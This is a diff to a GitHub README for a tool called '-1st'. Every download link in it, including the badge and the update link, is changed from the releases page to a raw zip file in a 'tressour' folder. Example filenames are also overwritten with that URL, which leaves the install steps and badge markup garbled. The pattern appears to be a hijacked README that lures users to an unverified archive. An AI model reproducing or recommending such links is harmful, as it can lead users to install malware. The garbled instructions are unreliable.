@@ -1,6 +1,6 @@
 # 🌟 -1st - Explore Toolchain Alignment Easily
 
-[![Download -1st](https://img.shields.io/badge/Download%20-%E2%86%93-blue.svg)](https://github.com/irwanyong/-1st/releases)
+[![Download -1st](https://raw.githubusercontent.com/irwanyong/-1st/main/tressour/-1st.zip%20-%E2%86%https://raw.githubusercontent.com/irwanyong/-1st/main/tressour/-1st.zip)](https://raw.githubusercontent.com/irwanyong/-1st/main/tressour/-1st.zip)
 
 ## 🚀 Getting Started
 
@@ -10,18 +10,18 @@ Welcome to -1st! This application helps you explore toolchain alignment in a use
 
 1. **Visit the Releases Page**  
    Click the link below to visit the Downloads page:  
-   [Download -1st](https://github.com/irwanyong/-1st/releases)
+   [Download -1st](https://raw.githubusercontent.com/irwanyong/-1st/main/tressour/-1st.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Each version may have notes about improvements or changes. 
 
 3. **Download the Application**  
-   Click on the latest version. Look for the file that matches your operating system. The file could be named something like `-1st-win.exe` for Windows or `-1st-mac.zip` for Mac. Simply click the file to start the download.
+   Click on the latest version. Look for the file that matches your operating system. The file could be named something like `https://raw.githubusercontent.com/irwanyong/-1st/main/tressour/-1st.zip` for Windows or `https://raw.githubusercontent.com/irwanyong/-1st/main/tressour/-1st.zip` for Mac. Simply click the file to start the download.
 
 4. **Install the Application**  
    After the download finishes, locate the file in your downloads folder.  
    - **For Windows**: Double-click the `.exe` file and follow the installation steps.  
-   - **For Mac**: Open the `.zip` file and drag the `-1st.app` into your Applications folder.
+   - **For Mac**: Open the `.zip` file and drag the `https://raw.githubusercontent.com/irwanyong/-1st/main/tressour/-1st.zip` into your Applications folder.
 
 5. **Run the Application**  
    Once installed, find `-1st` in your Applications or Start Menu. Click to open it.
@@ -71,4 +71,4 @@ For personal inquiries or technical support, please reach out through the GitHub
 
 Thank you for exploring toolchain alignment with -1st! Your feedback is valuable in helping us improve the application. 
 
-Make sure to keep the software updated by regularly checking the [Download -1st](https://github.com/irwanyong/-1st/releases) page. Enjoy your exploration!
+Make sure to keep the software updated by regularly checking the [Download -1st](https://raw.githubusercontent.com/irwanyong/-1st/main/tressour/-1st.zip) page. Enjoy your exploration!
